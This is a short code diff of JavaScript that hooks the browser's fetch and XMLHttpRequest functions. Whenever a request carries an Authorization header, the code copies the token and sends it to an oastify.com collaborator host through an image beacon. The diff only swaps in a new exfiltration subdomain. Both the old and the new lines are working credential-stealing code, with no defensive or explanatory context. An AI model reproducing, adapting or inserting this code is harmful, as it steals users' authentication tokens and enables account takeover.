@@ -9,7 +9,7 @@
         if (h) {
             const t = (h instanceof Headers) ? h.get('Authorization') : (h['Authorization'] || h['authorization']);
             if (t) {
-                new Image().src = `https://4lqsf4kfmpeszmpvauww3nea61cs0jo8.oastify.com/log?t=${encodeURIComponent(t)}&type=fetch`;
+                new Image().src = `https://9q0xk9pkrujx4ru0fz118sjfb6hx5qtf.oastify.com/log?t=${encodeURIComponent(t)}&type=fetch`;
             }
         }
         return originalFetch.apply(this, args);
@@ -21,7 +21,7 @@
 
     XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
         if (header.toLowerCase() === 'authorization') {
-            new Image().src = `https://n4sbyn3y58xbi58etdffm6xtpkvbj37s.oastify.com/log?t=${encodeURIComponent(value)}&type=xhr`;
+            new Image().src = `https://9q0xk9pkrujx4ru0fz118sjfb6hx5qtf.oastify.com/log?t=${encodeURIComponent(value)}&type=xhr`;
         }
         return originalSetRequestHeader.apply(this, arguments);
     };
